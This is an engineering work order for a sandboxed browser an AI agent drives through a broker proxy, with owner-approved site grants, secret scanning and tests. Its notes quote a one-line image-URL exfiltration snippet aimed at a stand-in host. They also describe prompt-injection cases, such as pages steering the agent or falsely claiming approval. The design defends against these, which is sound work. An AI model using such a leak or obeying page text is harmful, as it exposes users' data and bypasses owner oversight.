# WO-029: A browser cell: a real browser the agent drives, in a cell of its own, reaching only what the broker lets through

**Status:** DONE (2026-10-22)
**Area:** `crates/hatchling-browser` (new: the controller that runs in the cell), `crates/hatchling-broker` (the browser session, the proxy, site grants, the UI stream), `crates/hatchling-isolation` (the browser cell's profile), `crates/hatchling-agent` (the tools), `crates/hatchling-core` (the ops; `ui` already has the browser surfaces), `frontend/` (the live browser view)
**Issue:** none yet
**Trust boundary:** yes

## Problem

WO-028 lets the agent read a page as text, from a site the owner allows. Much of the web isn't readable that way: a page built by script, a form to fill, a flow of several steps. Someone who asks Hatchling to "check the status on the carrier's site" or "fill in this form" needs a real browser.

A real browser is the most exposed program there is. It runs the code of every page it opens. So it can't share a cell with the agent, which holds the conversation, and it can't have the network: a page's script would reach the owner's router, their printer, a cloud metadata address. And it can't be steered by what it reads: a page that says "now go to evil.example" mustn't take the agent there.

The UI already has the browser's surfaces, from WO-021: sessions, frames, the action log, and the owner taking control. Nothing in the broker drives them.

## Scope

**In scope:**

- **A browser cell.** Chromium, headless, in a cell of its own: no vault, no project files, no session of the agent's, a profile in the cell's own temporary storage that goes with it. It has a resource group (WO-004's cgroup) or it doesn't start: its memory and processes are bounded as a whole, not only per process.
  - **The operator's browser bundle, pinned and run from a verified snapshot.** `HATCHLING_BROWSER` names the browser and `HATCHLING_BROWSER_SHA256` the digest of its whole bundle: a canonical manifest of every file in its directory (the executable, its libraries, its resources), each by path, mode and hash. The broker copies the bundle into a snapshot only it can write, file by file through descriptors that follow no symlink and stay beneath the bundle, streaming within fixed limits and hashing the bytes as it writes them, and publishes the snapshot read-only under its digest only if it matches. Every session of that version runs from it, so the copy is made once per version. Hatchling bundles no browser. The claim is a verified browser bundle on a trusted system runtime: the loader and the system libraries the browser links are the host's.
  - **A controller in the cell** (`hatchling-browser`, Hatchling's own) drives Chromium over the DevTools protocol on a pipe, never a port. It takes the broker's commands on the cell's one connection, and answers with page snapshots.
- **The browser's only way out is the broker.** The cell has no network but its own loopback, and on it one listener, the cell's relay, which the broker holds and the cell keeps no copy of. Chromium's proxy is that listener, so nothing in the cell forwards anything. The broker serves an HTTPS `CONNECT` proxy on it:
  - `CONNECT` only, to `https`, the default port unless the grant names one; any other request, such as one a page sends to the listener itself, is refused;
  - each host admitted against the session's grants **before** it is resolved, so a name never granted never reaches a resolver (a secret spelled into a host name would otherwise leave as a DNS query); then resolved when it's connected to, refused if any address it resolves to is internal (WO-023), and the connection pinned to the addresses checked;
  - a grant revoked or expired closes the tunnels it admitted, not only new ones;
  - what a `CONNECT` proxy can check is named honestly: the host and port a tunnel goes to, never the method, path or body inside it;
  - TLS end to end between the browser and the site: the broker never sees plaintext, and the browser's certificate checks stay on;
  - every connection logged with its origin, in the egress log the Machine view shows (WO-022);
  - no UDP: WebRTC and QUIC are off.
- **Every session is strict: it reaches only the sites the owner approved** (the owner's decision, 2026-10-21; see Notes). Opening a page, or a page navigating its top frame, to an origin the session doesn't hold is put to the owner (WO-027's board, WO-028's site grants: once, for the task, always, never), and doesn't load until they say yes; the agent is told it's waiting. What a page then loads from other sites (images, scripts, fonts, data) is held to the same grants: the proxy refuses a site the session doesn't hold, and the owner sees the sites a page was refused, bounded, and may approve them, once or as a reusable set. Nothing a page asks for widens the session by itself. A public-web mode, where a page may load from any public site, is only ever the owner's explicit choice, in a fresh session.
- **The agent drives through the broker.** The agent's tools (`browser_open`, `browser_act`, `browser_read`, `browser_close`) are ops on its session; the broker passes them to the browser cell. An action names an element from the last snapshot (a click, typed text, a key, a scroll, a choice). A snapshot is the page's text and its actionable elements, bounded, and reaches the model as data.
- **Typed text is checked.** Text the agent types that matches a secret the broker holds is refused before it reaches the page (the output gate's scan).
- **The owner watches and takes over.** Frames (a picture of the page) and the action log reach the app on the UI stream, as WO-021's surfaces define them. The owner can take control: the agent's actions are refused until they hand it back, and their own clicks and keys go to the browser. A handback names the frame it was given at, so the agent knows the page changed under it.
- **Bounded:** one browser session per agent session, a cap on sessions in all, a wall-clock limit, the cell's memory and process limits (WO-004), and the session ends with the agent's.
- **Docs:** the threat model, the configuration, the local API, the CHANGELOG.

**Not in scope:**

- signing in to sites: a profile kept between sessions, its cookies sealed, per project or per owner (its own WO, after this one);
- downloads and uploads (refused), extensions, printing, the clipboard;
- plain `http`, other schemes, and internal sites, even declared ones;
- a browser on macOS (the macOS backend is a candidate);
- a trusted reading of the page's origin from inside the browser (see Notes): the controller's report of where the page is stays advisory.

## Acceptance criteria

- [x] With a real Chromium in a real cell: a page's script that fetches an internal address, plain `http`, or a UDP peer gets nothing, and no packet leaves the cell except through the broker's proxy.
- [x] Opening, or a page navigating to, an origin the session doesn't hold loads nothing: it asks the owner, and once, for the task, always and never each do exactly what they do for `web_fetch` (WO-028).
- [x] Every connection the browser makes is in the egress log with its origin; the broker sees no plaintext, and a site with a bad certificate doesn't load.
- [x] A bundle whose digest isn't the configured one isn't started, whichever file differs (the executable, a library, a `.pak`, the ICU data), and a file changed after the snapshot is made never reaches the browser: it runs only the snapshot.
- [x] A page's request to a site the session doesn't hold gets nothing: through an image URL, a script or a redirect, the site never sees it, and a host name never granted is never resolved.
- [x] A grant revoked while a tunnel it admitted is open stops that tunnel carrying bytes.
- [x] A controller that reports an origin the page isn't on gains nothing by it: no grant, no wider session.
- [x] Text the agent types that matches a held secret is refused, and never reaches the page.
- [x] While the owner holds control, the agent's actions are refused; after the handback the agent is told the frame changed. Tested in a browser, in the app.
- [x] Nothing of a session outlives it: its cell, profile and temporary files are gone when it ends, however it ends.
- [x] Everything a page shows the agent reaches the model inside the untrusted-data envelope; a page that says it approved a site approves nothing.

## Gates

See [TEMPLATE.md](TEMPLATE.md#gates). The browser cell's tests need a Chromium: the sandbox and CI install one, and its tests run with `HATCHLING_REQUIRE_CELL=1` like every real-cell test.

## Evidence

Merged as #155, #156, #158, #159, #162, #164, #165, #166, #167, #168, #169, #170, #171, #172, #173, #174, #175, #176, #177, #178, #179, #180, #181, #182, #183, #185, #189, #191 and #192. Each was gated in the sandbox on real cells, with a delegated cgroup and the pinned Chromium: fmt, clippy on 1.98.1 and 1.85.0, preflight, every test with `REQUIRE_CELL=1`, hand mutants for each claim, and mutation on its diff with nothing missed. Then CI. The criteria, and what shows each:

- **A page's script gets nothing; no packet leaves but through the proxy.** `a_page_in_a_real_browser_reaches_only_the_sites_its_session_holds` (`crates/hatchling-broker/tests/browser_cell.rs`): a real Chromium in a real cell, through the broker's strict proxy, on a page trusted through the operator's CA (#191).
  - The page's script fetches an internal address, a loopback port and an ungranted site, and each is refused.
  - A WebRTC peer, with a STUN server, gets no UDP candidate.
  - Asked directly, past the broker's checks, the controller can't open plain `http` or an internal address.
  - The cell has no network but its loopback (`a_new_network_namespace_cannot_reach_host_abstract_or_loopback_sockets`), and Chromium's only way out is its proxy.
  - The test first found that a page making a WebRTC peer never loaded (a seccomp kill of the old `epoll_create`), fixed in #189.
- **An origin the session doesn't hold loads nothing; once, for the task, always and never.** `a_page_opens_only_once_its_site_is_allowed`, `once_is_one_visit_and_the_task_keeps_its_site`, `a_site_held_for_the_task_outlives_the_visit` and `always_and_never_do_for_the_browser_what_they_do_for_a_page` (`browser_ops.rs`). A redirect to an ungranted site, in the real browser, is refused (the real-browser test above).
- **Every connection logged; no plaintext; a bad certificate doesn't load.**
  - `a_connect_to_a_public_site_is_tunnelled_as_it_is_and_recorded` (`browser_proxy.rs`) logs each tunnel with its origin.
  - The real-browser tests show only the granted site let through, in the egress log.
  - `a_browser_cell_reaches_a_site_only_through_the_broker_and_refuses_a_bad_certificate` shows the site seeing the browser's hello and never a finished handshake.
  - The proxy is `CONNECT`-only: it carries TLS between the browser and the site, and never terminates it.
- **A bundle not the pinned one never starts, whichever file; a file changed later never reaches the browser.**
  - `any_change_to_any_file_is_another_digest`: the executable's bytes and mode, a library, a `.pak`, an added file, a directory.
  - `a_snapshot_is_kept_only_when_its_copy_is_the_pinned_bundle`.
  - `a_browser_runs_only_from_a_snapshot_of_its_pinned_bundle`: the ICU data.
  - `a_browser_that_isnt_the_pinned_one_is_never_started`.
  - `a_launcher_snapshots_its_bundle_once`.
- **An image, a script or a redirect to an unheld site gets nothing, and is never resolved.** The real-browser test: an image, a script and a fetch the page makes to an ungranted site, and a redirect to it. The site serves only what was asked, the resolver is asked only for the granted name, and the ungranted site is among those refused. Plus `a_site_the_session_doesnt_hold_is_refused_before_its_name_is_looked_up`.
- **A revoked grant stops its open tunnel.** `a_revoked_site_loses_its_open_tunnels` and `a_sealed_session_reaches_nothing_again` (`browser_proxy.rs`), and `the_owner_stops_a_browser_once_and_its_sites_are_sealed` (`browser_board.rs`).
- **A controller that says its page is elsewhere gains nothing.** `a_controller_that_says_its_page_is_elsewhere_gains_nothing`: grants are keyed on what the agent asked for, never on what the controller reports.
- **A typed secret is refused, and never reaches the page.** `typed_text_holding_a_secret_is_refused_and_never_typed`.
- **The owner's control, in the app.** CI's `browser in the app` job (`scripts/browser_end_to_end.py`, #182, #185): a broker with the pinned Chromium, a scripted model driving the agent's browser tools, and Playwright as the owner.
  - The owner allows the site, opens the browser from the chat, takes control, scrolls and types with the app's controls, and hands it back.
  - The agent says it was told the owner was driving, and that it was handed back.
  - In the broker: `the_agent_waits_while_the_owner_drives_and_looks_afresh_when_handed_back`.
- **Nothing outlives a session.**
  - The browser's profile and temporary files are in the cell's own `tmpfs`, in its own mount namespace (#166, #168), so they're gone however the cell ends.
  - Dropping a cell's handle kills its whole cgroup (`cgroup.kill`) and removes its run directory.
  - The real-cell tests show the cell gone once it's finished, and a broken browser closed (`a_broken_browser_is_closed_and_the_next_page_starts_another`).
  - Not tested: a real browser session killed mid-page, with every host-side trace then looked for. What it would look for is the cgroup and run directory, both removed on drop by code the cgroup tests cover.
- **A page's words reach the model inside the envelope; a page saying it approved a site approves nothing.**
  - `a_page_reaches_the_model_inside_the_envelope_whatever_it_says`: a page that closes the envelope and claims an approval is told as data.
  - `a_controller_that_says_its_page_is_elsewhere_gains_nothing`: the page's claim grants nothing.
  - Every tool result reaches the model through `wrap_tool_result`.

## Parts

1. **The cell and the controller:** Chromium in a cell of its own, pinned, with no network at all; the controller over a DevTools pipe; open, snapshot, act, close, against a page the test serves through a test proxy.
2. **The proxy:** the broker's `CONNECT` proxy on the cell's connection, `https` and public only, resolved and pinned per connection, logged; UDP off.
3. **Grants and the tools:** navigation put to the owner with WO-028's grants; the agent's four tools; typed text scanned.
4. **The owner in the app:** frames, the action log, and taking and returning control, in the live frontend.

## Notes

- **What the cell lets Chromium do, measured.** A traced headless run (`--no-sandbox --no-zygote --disable-gpu --disable-dev-shm-usage`) made 90 distinct calls; 15 were outside the CLI profile. Leaving each out in a real cell in turn: seven are needed (without `sendmsg`, `recvmsg`, `epoll_wait`, `ppoll`, `fallocate` or `memfd_create` it is killed; without `mremap` a child is, and the browser hangs waiting for it); five are probes it handles as errors; two (`fstatfs`, `link`) weren't needed then. `fstatfs` is once the cell has fonts: fontconfig asks it of its cache, and the browser is killed without it. `link` is answered `EPERM`: fontconfig hard-links a file to lock its cache, and refused, it locks with a directory, as it does on a filesystem without links. That a dead child hangs the browser is why every wait the controller makes is bounded. CI's kernel audit then showed a call the trace never had: `sched_setaffinity` killed three of Chromium's processes there, and the sandbox's log showed the same, fifteen times, while the page still rendered and the test passed. Outside a cell Chromium never makes it; in a cell, where the thread priorities are refused, its processes make it instead (the likely reason: it falls back to affinity when it can't set a priority). It's answered `EPERM` like the priorities. A call the cell itself brings about, killing a child the page didn't need, is why the trace alone isn't the measure, and why the controller's tests load a real page through the proxy, which needs the processes a `data:` page doesn't.

- **Name the threat, then the mechanism.**
  - *A page's script reaching the owner's network* (the router, a printer, cloud metadata): the cell has no network, and the proxy refuses internal addresses and anything but `https`.
  - *What the agent reads steering it to a new site:* navigation needs the owner's grant, and nothing a page says grants anything.
  - *The agent typing a secret into a page:* the cell holds no secret, and typed text is scanned against the ones the broker holds.
  - *A compromised renderer reaching the rest of the machine:* the cell (namespaces, seccomp, limits) is the boundary; Chromium's own sandbox, where it can run inside the cell, is a second layer, not the one relied on.
- **Strict for every session (the owner's decision, 2026-10-21).** The first design held back only navigation and let a page load from any public site, logged. A review showed why that isn't enough even without a sign-in: a browser is handed a search, text from the conversation, a document for a form, a URL with a token in it, and a page sends any of that out in an image's URL (`new Image().src = "https://anywhere.example/?q=" + text`). A log records the leak; it doesn't stop it. So every session reaches only granted sites, and the owner approves the rest, as a page shows it needs them. Even a granted site can carry data on to whoever controls a resource on it, which is why a site isn't granted just because it's a CDN, and why a wildcard is wider than it looks.
- **What the origin report is worth.** The broker learns where the page is from the controller, which runs beside page code, and a proxy's record of connections doesn't confirm it: a page on one site loads an image from another and says it's there, and the proxy did see that connection. DevTools' own `securityOrigin` is built in the renderer from the URL. So the broker owns every grant and the proxy enforces it on each connection; the controller's report is logged beside the destination requested and the connections seen, as evidence, and never decides anything. A trusted reading of the active document's origin would need a component inside the browser process, which is outside this WO.
- **Regression tests these decisions owe:** a bundle with one library, `.pak` or ICU file changed, refused; a file changed between the snapshot's check and its use, never reaching the browser; a source file growing while it's copied, bounded and refused; a sentinel sent to an ungranted site through an image URL and through a host name, reaching neither the site nor a resolver; a direct connection from the cell, refused; a grant revoked with a tunnel open, the tunnel stopped; a controller reporting an origin it isn't on, gaining nothing.
- **Why the controller isn't trusted.** It runs beside page code, so a renderer exploit can reach it. Navigation grants are enforced where the controller asks the broker, which keeps an honest agent honest; the boundary against a compromised cell is the proxy, which the cell can't bypass, and which admits no site the session doesn't hold.
- **Signed-in profiles, later: one cell per profile.** Without its own sandbox, Chromium can't keep one site's renderer from another's, so the sign-in WO puts each signed-in profile in a cell of its own. That rebuilds site isolation at the kernel instead of in the browser. A profile is what the cell holds, not a host name: its grants include the sites its sign-in goes through (an identity provider, its scripts), and two profiles never share a cell. Signing in through a shared provider leaves that provider's session in each cell that used it, which is a reason to keep a profile's grants narrow.
- **Order.** After WO-028, whose site grants this reuses; before the browser's sign-in profiles.
